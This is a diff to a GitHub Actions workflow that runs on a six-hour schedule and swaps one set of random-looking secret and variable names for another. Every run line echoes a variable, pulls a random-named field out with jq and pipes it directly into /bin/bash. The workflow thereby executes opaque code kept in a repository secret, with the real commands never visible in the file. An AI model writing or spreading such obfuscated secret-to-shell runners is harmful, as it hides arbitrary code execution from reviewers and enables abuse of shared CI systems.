@@ -3,7 +3,7 @@ name: caochenxi8710
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '2 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,26 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: caochenxi8710
         env:
-          ayip6: ${{ secrets.ayip6 }}
+          eql39710: ${{ secrets.eql39710 }}
         run: |
-          echo $ayip6 | jq -r .b42 | /bin/bash
-          echo $z9571 | jq -r .azpmz9495 | /bin/bash
-          echo $dfsno6 | jq -r .ep2 | /bin/bash
-          echo $yc730 | jq -r .je7 | /bin/bash
-          echo $ie6 | jq -r .ysz8 | /bin/bash
-          echo $qhv76304 | jq -r .u705 | /bin/bash
-          echo $d4560 | jq -r .qywjn40 | /bin/bash
-          echo $q683 | jq -r .wfjyi79385 | /bin/bash
-          echo $eaqay82722 | jq -r .b7 | /bin/bash
-          echo $y6780 | jq -r .pzipu32848 | /bin/bash
-          echo $t232 | jq -r .uc165 | /bin/bash
-          echo $ue1 | jq -r .ll33 | /bin/bash
-          echo $i342 | jq -r .moe5829 | /bin/bash
-          echo $lickm2584 | jq -r .liii6214 | /bin/bash
-          echo $fmr02251 | jq -r .ux442 | /bin/bash
-          echo $dw27 | jq -r .rnbvy5091 | /bin/bash
-          echo $mlpnb2 | jq -r .zwhf9 | /bin/bash
-          echo $kd25427 | jq -r .airfb99010 | /bin/bash
-          echo $ciprj0 | jq -r .wgxyj263 | /bin/bash
-          echo $m12 | jq -r .rxi16848 | /bin/bash
+          echo $eql39710 | jq -r .tgux53 | /bin/bash
+          echo $fxm7 | jq -r .dj88 | /bin/bash
+          echo $e1 | jq -r .y9 | /bin/bash
+          echo $d33160 | jq -r .luklm93 | /bin/bash
+          echo $gs5563 | jq -r .vn8 | /bin/bash
+          echo $pjfgq444 | jq -r .qldz7 | /bin/bash
+          echo $w02 | jq -r .n1 | /bin/bash
+          echo $lq106 | jq -r .djhn691 | /bin/bash
+          echo $l6 | jq -r .wif34 | /bin/bash
+          echo $nbwo782 | jq -r .uaw96735 | /bin/bash
+          echo $dln5 | jq -r .jwfyv71 | /bin/bash
+          echo $spwk0908 | jq -r .vrdm54 | /bin/bash
+          echo $nqg8468 | jq -r .adhrq363 | /bin/bash
+          echo $hnkog51060 | jq -r .jbo794 | /bin/bash
+          echo $vjs27 | jq -r .cnj46 | /bin/bash
+          echo $phk7 | jq -r .fzth6231 | /bin/bash
+          echo $erfox539 | jq -r .b40 | /bin/bash
+          echo $ccpyg3 | jq -r .at035 | /bin/bash
 
